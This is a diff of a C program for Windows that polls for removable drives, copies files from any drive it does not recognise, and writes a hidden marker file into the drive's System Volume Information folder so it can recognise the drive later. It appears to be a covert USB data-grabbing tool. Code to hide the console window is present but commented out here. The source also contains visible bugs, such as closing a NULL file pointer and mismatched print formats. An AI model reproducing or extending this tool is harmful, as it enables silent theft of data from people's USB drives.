@@ -21,23 +21,72 @@ char* hash_generator(int SIZE) {
     srand(time(0));
 
     for (int i=0; i<SIZE; i++) {
-
         // Generate a random number [0...61]
         char cur = charset[rand()%charset_size];
         hash[i] = cur;
-
     }
     // End the string with a null character and return it
     hash[SIZE] = 0;
     return hash;
 }
 
+void save_data(wchar_t* drive_name) {
+    char filename[100] ;
+    sprintf(filename, "%SSystem Volume Information\\md5.log",drive_name);
+    FILE *file = fopen(filename, "w");
+    char *hash= hash_generator(100);
+    fprintf(file, "%s\n", hash);
+
+    FILE *saved_data = fopen("D:\\Copied\\Saved_Data\\saved_data.log", "w");
+    time_t seconds = time(NULL);
+    fprintf(saved_data, "%s %lld\n", hash, seconds);
+
+    fclose(file);
+    fclose(saved_data);
+}
+
+int recognize_device(wchar_t* drive_name) {
+    char filename[100] ;
+    sprintf(filename, "%SSystem Volume Information\\md5.log",drive_name);
+    printf("Name =%s\n", filename);
+    FILE *file;
+    file = fopen(filename, "r");
+
+    if (file == NULL) {
+        fclose(file);
+        return 0;
+    }
+    else {
+        // check hash and timestamp //
+        char hash[101];
+        time_t last_timestamp, cur_seconds = time(NULL);
+        fscanf(file, "%s", hash);
+        
+        
+        FILE *saved_data = fopen("D:\\Copied\\Saved_Data\\saved_data.log", "r");
+        char cur_hash[101];
+        int reached_end = 0;
+        do {
+            if (fscanf(saved_data, "%s %lld", cur_hash, &last_timestamp) == EOF){
+                reached_end = 1;
+                printf("%s == %d %lld\n", hash, cur_hash, last_timestamp);
+                break;
+            }
+        } while (strcmp(hash, cur_hash) != 0);
+        
+        if (reached_end == 1) return 0;
+        fclose(file);
+        printf("hello \n");
+        return 1;
+    }
+}
+
 
 int exec() {
-    // Controlling the console window
+    // Hiding the console window
     HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_MINIMIZE); // Minimizes the Console
-    ShowWindow(hWnd, SW_HIDE); // Hides the Console
+    //ShowWindow(hWnd, SW_MINIMIZE);    // Minimizes the Console
+    //ShowWindow(hWnd, SW_HIDE);        // Hides the Console
 
     // Get a list of all Logical Drives
     wchar_t LogicalDrives[MAX_PATH] = {0};
@@ -61,18 +110,7 @@ int exec() {
             // Checks if the drive type is a Removable device
             if (drive_type==2) {
 
-                // Check if the file exists
-                char filename[100] ;
-                sprintf(filename, "%Smd5.log",SingleDrive);
-                printf("Name =%s\n", filename);
-                FILE *file;
-                file = fopen(filename, "r");
-
-
-                if (file == NULL) {
-                    fclose(file);
-                    
-                    printf("File Not Found\n");
+                if (recognize_device(SingleDrive) == 0) {
                     printf("Uncognized device!");
                     printf("\nPreparing to Copy Files\n");
 
@@ -82,13 +120,11 @@ int exec() {
                     system(command);
 
                     // Remember the drive creating a md5.log file the root dir
-                    file = fopen(filename, "w");
+                    save_data(SingleDrive);
                 }
                 else {    
                     printf("File Found\n");
                     printf("Device is Recognized!\n");
-
-                    fclose(file);
                 }
             }
             // Next Drive
@@ -98,7 +134,7 @@ int exec() {
 }
 
 int main() {
-    printf("%s\n", hash_generator(10));
+    
     while(1){
         exec();
         Sleep(2000);
